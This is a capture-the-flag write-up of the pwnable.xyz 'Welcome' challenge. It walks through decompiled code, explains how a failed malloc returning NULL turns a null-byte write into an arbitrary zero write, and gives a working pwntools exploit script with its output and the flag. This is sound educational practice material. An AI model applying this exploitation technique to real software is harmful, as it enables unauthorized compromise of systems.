# Pwnable.xyz Welcome

Run file:
```
$ ./challenge
Welcome.
Leak: 0x7faadee40010
Length of your message: 123
Enter your message: aaaaa
aaaaa
```

Only 1 interesting function in Ghidra:
```
undefined8 FUN_00100920(void)
{
  long *plVar1;
  void *__buf;
  long in_FS_OFFSET;
  size_t local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_00100b4e();
  puts("Welcome.");
  plVar1 = (long *)malloc(0x40000);
  *plVar1 = 1;
  __printf_chk(1,"Leak: %p\n",plVar1);
  __printf_chk(1,"Length of your message: ");
  local_28 = 0;
  __isoc99_scanf(&%lu,&local_28);
  __buf = malloc(local_28);
  __printf_chk(1,"Enter your message: ");
  read(0,__buf,local_28);
  *(undefined *)((long)__buf + (local_28 - 1)) = 0;
  write(1,__buf,local_28);
  if (*plVar1 == 0) {
    system("cat /flag");
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Obviously, there is no easy flaw in the code, so the only way to get the flag is to make `*plVar1 == 0`, the easiest way is to use `((long)__buf + (local_28 - 1)) = 0` line.  
Read the malloc() manual, we know that malloc returns NULL on error. Attempting to allocate more than PTRDIFF_MAX bytes is considered an error.  
When it happens, the `((long)__buf + (local_28 - 1)) = 0` line becomes `local_28 - 1 = 0`.  
The leaked address is also a large number. So just set local_28 = leaked address + 1 and we're done!  
Exploit:

```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

con = remote("svc.pwnable.xyz", 30000)

con.recvuntil(b"Leak: ")
leak = int(con.recvline().decode().strip("\n"), 16)
log.info(hex(leak))

con.sendlineafter(b"Length of your message: ", str(leak+1))
con.sendlineafter(b"Enter your message: ", b"a")

con.interactive()
```

When we run it:
```
$ ./exp.py
[+] Opening connection to svc.pwnable.xyz on port 30000: Done
[*] 0x7fc328f74010
/home/teapot/pwn/pwnxyz/COM_welcome/./exp.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  con.sendlineafter(b"Length of your message: ", str(leak+1))
[*] Switching to interactive mode
FLAG{did_you_really_need_a_scriptXXXXXXXXXXXXXXX}
```

Yup, I don't really need a script.
